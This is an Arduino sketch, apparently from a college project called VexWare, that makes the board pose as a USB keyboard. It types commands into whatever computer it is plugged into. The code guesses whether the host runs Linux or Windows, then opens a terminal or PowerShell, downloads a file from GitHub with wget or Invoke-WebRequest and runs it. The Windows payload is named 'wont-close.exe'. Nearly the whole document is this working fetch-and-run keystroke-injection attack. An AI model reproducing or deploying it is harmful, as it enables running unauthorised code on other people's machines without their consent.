/*
OS Recognition Injection Sequence

Uses an Arduino R4 to emulate an HID keyboard and inject keystroke commands to determine if the target
computer is running Linux or Windows, and then inject keystrokes to download the approriate file
from GitHub and run the file on the target computer.

There isn't any direct way for the Arduino to determine what operating system the target computer
is running. This script begins with injecting keystrokes assuming a Linux OS. The keystrokes
download and install pip and pyserial on to the logged in account, then downloads a test script
from the VexWare repo that sends strings over serial to the Arduino. The Arduino then temporarily
ends keyboard emulation and reads from its serial port. If a string is detected, then the Arduino
can determine that the computer is running Linux. If a string is not detected, then the Arduino
assumes that the computer is running Windows.

Based on the OS recognition result, the Arduino then resumes keyboard emulation and injects
the appropriate keystrokes to bring up a terminal, download the approriate file from GitHub and
runs the file.

The general overview of the keystroke sequence is shown below:
Part 1: OS Recognition, keystrokes assuming Linux
- Open terminal
- Download and install pip and pyserial
- Download python script from GitHub to send strings over serial
- Run python script and determine OS

Part 2: Run and download files
Linux sequence:
- Open terminal
- Change directory
- Download specified file
- Run specified file

Windows sequence:
- Open Powershell
- Download file
- Run file

Inputs:
l_download_url: For Linux, a string containing the URL to a specified file off of GitHub.
l_file_name: For Linux, a string containing the name of the downloaded file to run.
w_download: For Windows, a string containing the powershell command to download a specified file off 
of GitHub.
w_file_name: For Windows, A string containing the name of the downloaded file to run.
*/

#include <Keyboard.h>

// Linux parameters
String l_download_url = "https://raw.githubusercontent.com/olincollege/VexWare/master/src/test";
String l_file_name = "test";

// Windows parameters
String w_download = "Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/olincollege/VexWare/master/src/visuals/wont-close.exe\" -OutFile \"wont-close.exe\"";
String w_file_name = "wont-close.exe";

int hasRun = 0; // boolean value to run sequence once
unsigned long td = 1000; // delay after each command
long baudRate = 9600;
int os_attempts = 0;
int linux_os = 0; // boolean value to determine if OS is Linux

void setup() {
  pinMode(2, INPUT_PULLUP);
  pinMode(21, OUTPUT);
  digitalWrite(21,HIGH); // turn off LED 
  Keyboard.begin();
}

void loop() {
  // Add delay to allow target system to recognize Arduino as keyboard
  delay(800);

  // loop will only run if D2 is pulled low to prevent accidental keystroke injections
  if (digitalRead(2) == LOW) {
    if (hasRun == 0) {
      // Begin keystroke sequence

      // First, determine the operating system.
      // Try opening Linux terminal with several popular shortcuts.
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press('t');
      Keyboard.releaseAll();
      delay(td); // let animation play

      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
      delay(td);

      // Install pip on local user, without sudo permissions
      Keyboard.print("wget https://bootstrap.pypa.io/get-pip.py");
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
      delay(3000); // download file

      Keyboard.print("python3 get-pip.py --user");
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
      delay(5000); // let pip install

      // Pip install pyserial
      Keyboard.print("pip install pyserial");
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
      delay(5000); // let pyserial install

      // Download python script from repo
      Keyboard.print("wget https://raw.githubusercontent.com/olincollege/VexWare/master/src/os_recognition/test_serial_linux.py");
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
      delay(3000); // download file

      // Run python script
      Keyboard.print("python3 test_serial_linux.py");
      Keyboard.press(KEY_RETURN);
      Keyboard.releaseAll();
      delay(td);

      // End keyboard emulation and begin reading serial port
      Keyboard.end();
      delay(2000);

      Serial.begin(baudRate);
      // attempt to detect a serial write 4 times
      while (os_attempts<5){
        // Check if data is available to read from serial. If data is received, the system is running Linux.
        if (Serial.available() > 0) {
          String receivedString = Serial.readStringUntil('\n');
          digitalWrite(21,LOW); // turn on LED 
          linux_os = 1;
        }
        if (linux_os == 1){
          break;
        }
      delay(1000);
      os_attempts++;
      }
      
      Serial.end();
      delay(td);

      // restart keyboard emulation
      Keyboard.begin();
      // Add delay to allow target system to recognize Arduino as keyboard
      delay(800);

      // based on determined OS, run the appropriate keystroke injection sequence.
      // Linux
      if (linux_os == 1){
        // Try opening Linux terminal with several popular shortcuts.
        Keyboard.press(KEY_LEFT_CTRL);
        Keyboard.press(KEY_LEFT_ALT);
        Keyboard.press('t');
        Keyboard.releaseAll();
        delay(td);

        Keyboard.press(KEY_LEFT_ALT);
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
        delay(td); 

        // Change file directory
        Keyboard.print("cd ~/Desktop");
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
        delay(td);

        // Download file off of GitHub
        Keyboard.print("wget " + l_download_url);
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
        delay(3000); // let file download

        // Make file an executable and run downloaded file
        Keyboard.print("chmod +x " + l_file_name);
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
        delay(td);

        Keyboard.print("./" + l_file_name);
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
        delay(td);

        hasRun = 1;
      }

      // Windows
      if (linux_os == 0){
        // Open Powershell terminal as Administrator. Windows has lots of animations in the
        // start menu, so many delays are required for keystroke timing.
        Keyboard.press(KEY_LEFT_GUI); // open Start menu
        Keyboard.releaseAll();
        delay(td); // let animation play

        Keyboard.print("powershell");
        delay(td); // let animation play

        Keyboard.press(KEY_RIGHT_ARROW);
        Keyboard.releaseAll();
        delay(td); // let animation play

        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
        delay(4000); // give powershell time to open

        // Download file off of GitHub
        Keyboard.print(w_download);
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
        delay(td); // let animation play

        // Run the downloaded file
        Keyboard.print("./"+w_file_name);
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();

        hasRun = 1;
      }
    }
  }
}
